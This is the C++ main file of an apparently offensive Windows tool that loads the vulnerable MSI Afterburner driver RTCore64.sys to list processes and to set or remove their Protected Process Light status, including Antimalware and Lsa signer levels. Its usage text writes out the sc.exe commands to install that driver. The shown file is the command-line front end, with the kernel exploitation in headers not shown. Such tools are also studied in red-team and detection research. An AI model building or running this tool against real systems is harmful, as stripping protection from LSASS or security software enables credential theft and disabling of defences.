#include <iostream>
#include "OffsetFinder.h"
#include "RTCore.h"
#include "Utils.h"
#include "Controller.h"

VOID PrintUsage(LPWSTR Prog);
VOID PrintKernelDriverUsage();

int wmain(int argc, wchar_t* argv[])
{
    OffsetFinder* of;
    RTCore* rtc;
    Controller* ctrl;
    DWORD dwPid;

    if (argc < 2)
    {
        PrintUsage(argv[0]);
        PrintKernelDriverUsage();
        return 1;
    }

    of = new OffsetFinder();
    rtc = new RTCore();
    ctrl = new Controller(rtc, of);

    if (!of->FindAllOffsets())
    {
        ERROR(L"Failed to determine the required offsets.");
        return 2;
    }

    if (!_wcsicmp(argv[1], L"list"))
    {
        if (!ctrl->ListProtectedProcesses())
            return 2;
    }
    else if (!_wcsicmp(argv[1], L"get") || !_wcsicmp(argv[1], L"unprotect"))
    {
        ++argv;
        --argc;

        if (argc < 2)
        {
            ERROR(L"Missing argument(s) for command: %ws", argv[0]);
            return 1;
        }

        if (!(dwPid = wcstoul(argv[1], nullptr, 10)))
        {
            ERROR(L"Failed to parse argument as an unsigned integer: %ws", argv[1]);
            return 1;
        }

        if (!_wcsicmp(argv[0], L"get"))
        {
            if (!ctrl->GetProcessProtection(dwPid))
                return 2;
        }
        else if (!_wcsicmp(argv[0], L"unprotect"))
        {
            if (!ctrl->UnprotectProcess(dwPid))
                return 2;
        }
        else
        {
            ERROR(L"Unknown command: %ws", argv[0]);
            return 1;
        }
    }
    else if (!_wcsicmp(argv[1], L"set") || !_wcsicmp(argv[1], L"protect"))
    {
        ++argv;
        --argc;

        if (argc < 4)
        {
            ERROR(L"Missing argument(s) for command: %ws", argv[0]);
            return 1;
        }

        if (!(dwPid = wcstoul(argv[1], nullptr, 10)))
        {
            ERROR(L"Failed to parse argument as an unsigned integer: %ws", argv[1]);
            return 1;
        }

        if (!_wcsicmp(argv[0], L"set"))
        {
            if (!ctrl->SetProcessProtection(dwPid, argv[2], argv[3]))
                return 2;
        }
        else if (!_wcsicmp(argv[0], L"protect"))
        {
            if (!ctrl->ProtectProcess(dwPid, argv[2], argv[3]))
                return 2;
        }
        else
        {
            ERROR(L"Unknown command: %ws", argv[0]);
            return 1;
        }
    }
    else
    {
        ERROR(L"Unknown command: %ws", argv[1]);
        return 1;
    }

    DEBUG(L"Done");

    return 0;
}

VOID PrintUsage(LPWSTR Prog)
{
    wprintf(
        L"Usage:\n"
         "  %ws <CMD> <ARGS>\n"
         "\n"
         "Commands:\n"
         "  list\n"
         "  get <PID>\n"
         "  set <PID> <PP|PPL> <TYPE>\n"
         "  protect <PID> <PP|PPL> <TYPE>\n"
         "  unprotect <PID>\n"
         "\n"
         "Signer Types:\n"
         "  Authenticode, CodeGen, Antimalware, Lsa, Windows, WinTcb, WinSystem\n"
         "\n",
        Prog
    );
}

VOID PrintKernelDriverUsage()
{
    wprintf(
       L"Install the driver:\n"
        "  sc.exe create RTCore64 type= kernel start= auto binPath= C:\\PATH\\TO\\RTCore64.sys DisplayName= \"Micro - Star MSI Afterburner\"\n"
        "  net start RTCore64\n"
        "\n"
        "Uninstall the driver:\n"
        "  net stop RTCore64\n"
        "  sc.exe delete RTCore64\n"
        "\n"
    );
}